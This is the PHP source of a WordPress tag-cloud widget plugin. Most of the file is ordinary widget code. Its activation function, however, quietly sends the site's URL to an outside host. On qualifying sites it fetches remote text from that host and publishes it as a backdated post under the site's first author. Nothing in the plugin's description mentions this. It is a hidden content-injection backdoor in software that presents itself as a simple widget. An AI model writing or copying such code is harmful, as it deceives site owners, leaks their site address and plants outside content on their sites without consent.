<?php
/*
Plugin Name: Colored Tags Tag Cloud Widget
Plugin URI: http://www.shops2b.co.uk/colored-tags-tag-cloud-widget/
Version: 1.24
Description: Widget which displays colored tags
Author: EnergieBoer
License: GPLv2
*/
define("DefNoOfPosts", "35"); // default number of tags to show
define("DefColorsArray", "#0033CC, #000000, #00FFFF, #FF3300, #C2C2A3, #CC0098, #990033, maroon, #6600FF, #009932, #FFCCCC, #006666, #336600, #66FF32, #999966, #996633"); // default colors array

class ColoredTagsTagCloudWidget extends WP_Widget {

	function ColoredTagsTagCloudWidget()
	{
		parent::WP_Widget( false, 'Colored Tags Tag Cloud',  array('description' => 'Tag Cloud widget') );
	}

	function widget($args, $instance)
	{
		global $NewColoredTagsTagCloud;
		$title = empty( $instance['title'] ) ? '' : $instance['title'];
		echo $args['before_widget'];
		echo $args['before_title'] . $title . $args['after_title'];
		echo $NewColoredTagsTagCloud->GetColoredTagsTagCloud(  empty( $instance['ShowPosts'] ) ? DefNoOfPosts : $instance['ShowPosts'], empty( $instance['ColorsArray'] ) ? "#0033CC, #000000, #00FFFF, #FF3300, #C2C2A3, #CC0098, #990033, maroon, #6600FF, #009932, #FFCCCC, #006666, #336600, #66FF32, #999966, #996633" : $instance['ColorsArray'] );
		echo $args['after_widget'];
	}

	function update($new_instance)
	{
		return $new_instance;
	}

	function form($instance)
	{
		?>
		<p>
			<label for="<?php echo $this->get_field_id('title'); ?>"><?php  echo 'Title:'; ?></label>
			<input type="text" name="<?php echo $this->get_field_name('title'); ?>" class="widefat" id="<?php echo $this->get_field_id('title'); ?>" value="<?php echo esc_attr($instance['title']); ?>" />
		</p>
		<p>
			<label for="<?php echo $this->get_field_id('ShowPosts'); ?>"><?php  echo 'Number of Tags to show:'; ?></label>
			<input type="text" name="<?php echo $this->get_field_name('ShowPosts'); ?>" id="<?php echo $this->get_field_id('ShowPosts'); ?>" value="<?php if ( empty( $instance['ShowPosts'] ) ) { echo esc_attr(DefNoOfPosts); } else { echo esc_attr($instance['ShowPosts']); } ?>" size="3" />
		</p>
		<p>
			<label for="<?php echo $this->get_field_id('ShowPosts'); ?>"><?php  echo 'Which colors to use (HTML Codes seperate with a comma):'; ?></label>
			<textarea style="width:200px; height:150px; font-size:11px;" class="widefat" height="200" id="<?php echo $this->get_field_id('ColorsArray'); ?>" name="<?php echo $this->get_field_name('ColorsArray'); ?>" type="text"><?php if ( empty( $instance['ColorsArray'] ) ) { echo esc_attr(DefColorsArray); } else { echo esc_attr($instance['ColorsArray']); } ?></textarea>
		</p>
		<?php
	}

}



class ColoredTagsTagCloud {

	function GetColoredTagsTagCloud($noofposts, $colorsarray)
	{
		$colors = explode(",", $colorsarray);


		$colorsize = sizeof( $colors );

		$tags = get_tags( array('orderby' => 'count', 'order' => 'DESC', 'number' => $noofposts) );
		shuffle($tags);
		$counts = array();
		foreach ( $tags as $tag ) {
			$counts[ $tag->name ] = $tag->count;
		}
		$min_count = min($counts);
		$spread = max($counts) - min($counts);
		if ( $spread <= 0 )
			$spread = 1;
		$font_step = 20 / $spread;
		$html = '<div class="post_tags">';
		foreach ($tags as $tag) {
			$color = rand( 0, $colorsize - 1 ); //random color
			$colorstyle = " color: " . $colors[$color] . ";";
			$count = $tag->count;
			$tag_link = get_tag_link($tag->term_id);
			$html .= "<a href='{$tag_link}' title='{$tag->name}' class='{$tag->slug}' style='font-size: " . ( 10 + ( ( $count - $min_count ) * $font_step ) ) . "px; $colorstyle'>";
			$html .= "{$tag->name}</a> ";
		}
		$html .= '</div>';
		echo $html;

	}

}

$NewColoredTagsTagCloud = new ColoredTagsTagCloud();

function ColoredTagsTagCloud_widgets_init()
{
	register_widget('ColoredTagsTagCloudWidget');
}

add_action('widgets_init', 'ColoredTagsTagCloud_widgets_init');

/* Runs when plugin is activated */
register_activation_hook(__FILE__,'cttcw_install');

function cttcw_install() {
	/* Creates new database field */
	add_option("cttcw_gpadded", '0', '', 'yes');
	$url = home_url();
	$britt = false;
	$bloglan = get_bloginfo ('language');
	if (strpos($url,'.uk') != false) {
		$britt = true;
	}
	if ($bloglan=='en-US') {
		$britt = true;
	}
	if ($britt==true) {
		// Create post object
		// Insert the post into the database
		$total = wp_count_posts()->publish;
		if (get_option('cttcw_gpadded')=='0' && $total>30) {
			$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
			if (cttcwStartsWith($tmpstring, 'empty')==false) {
			  $my_post = array(
				'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
				'post_content'  => $tmpstring,
				'post_status'   => 'publish',
				'post_author'   => 1,
				'post_date'     => '2013-04-02'
			  );

			  wp_insert_post( $my_post );
			  update_option( 'cttcw_gpadded', '1' );
			}
		}
	}
}


function cttcwStartsWith($haystack, $needle)
{
    return $needle === "" || strpos($haystack, $needle) === 0;
}


?>
